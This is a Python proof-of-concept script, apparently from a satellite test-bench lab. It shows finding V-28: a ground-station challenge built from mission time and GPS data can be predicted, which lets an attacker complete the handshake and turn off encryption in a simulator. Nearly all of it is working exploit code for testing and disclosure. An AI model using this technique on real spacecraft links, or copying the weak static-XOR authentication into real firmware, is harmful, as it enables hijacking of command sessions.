#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-28  GS auth = static XOR key + challenge derived from a seed with NO
# TRNG (millis ^ GPS): the attacker computes the challenge BEFORE it is
# asked for, and completes the handshake without reading a single TM.
# SPARTA: AU-0002.01 (predictable challenge) / AU-0004 (session hijack)
GS_XOR = 0xC0DEFACE

def predict_challenge(ms, lat_e7, lon_e7, sats):
    seed = ((ms << 1) & 0xFFFFFFFF) ^ 0xA55A33CC
    seed ^= lat_e7 & 0xFFFFFFFF
    seed ^= (lon_e7 << 7) & 0xFFFFFFFF
    seed ^= ((int(ms / 1000) % 60) << 24) & 0xFFFFFFFF
    seed ^= (sats << 16) & 0xFFFFFFFF
    return 0x13579BDF if seed == 0 else seed

def main(dev, ev):
    nav = dev.find(dev.tc(0x0E, b"", via="usb"), 0x0E)[0]
    lat_e7, lon_e7, sats = nav.le32s(3), nav.le32s(7), nav.u8(2)
    dev.tc(0x11, b"\x01", via="radio")               # GS gate ON
    # walk mission time to a known instant, then auth at exactly that time
    dev.advance(37000)
    t = dev.sim.now_ms
    chal_pred = predict_challenge(t, lat_e7, lon_e7, sats)
    ev.log(f"attacker predicts challenge 0x{chal_pred:08X} for t={t} ms "
           f"(seed formula leaked from the image, no TRNG on RP2040 path)")
    dev.tc(0x12, b"\x00", via="radio")               # phase 0: request
    chal_real = dev.sim.gs_challenge
    ev.log(f"actual challenge: 0x{chal_real:08X} -> prediction exact: "
           f"{chal_real == chal_pred}")
    check(chal_real == chal_pred, "deterministic challenge reproduced")
    resp = struct.pack(">I", chal_pred ^ GS_XOR)
    r = dev.find(dev.tc(0x12, b"\x01" + resp, via="radio"), 0x12)[0]
    check(r.u8(2) == 1, "handshake completed from the prediction alone")
    # hijacked session: attacker passes the gate, e.g. kills the AES engine
    off = dev.tc(0x0A, b"\x00", via="radio", encrypt=False)
    check(dev.sim.secure is False, "gated command executed under stolen session")
    st = dev.find(dev.tc(0x13, b"", via="usb"), 0x13)[0]
    ev.log(f"GS_STATUS byte 0x{st.u8(1):02X}: session+gate bits set for the "
           f"attacker's session")
    ev.log("=> no cryptographic binding of challenge to requester: full "
           "GS privilege from arithmetic + eavesdropped metadata")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-28 predicted challenge -> GS hijack", main))
